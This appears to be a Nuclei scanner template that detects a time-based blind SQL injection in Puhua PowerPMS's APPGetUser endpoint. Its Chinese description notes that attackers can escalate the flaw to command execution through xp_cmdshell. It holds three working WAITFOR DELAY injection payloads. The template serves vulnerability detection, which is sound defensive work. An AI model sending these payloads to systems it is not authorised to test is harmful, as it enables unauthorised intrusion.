id: PowerPMS-APPGetUser-sqli

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 普华-PowerPMS APPGetUser 接口处存在SQL注入漏洞,未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
  reference:
    - https://blog.csdn.net/qq_41904294/article/details/140931802
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A3%27--"
      - "{{BaseURL}}/APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A6%27--"
      - "{{BaseURL}}/APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A9%27--"
      

    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"
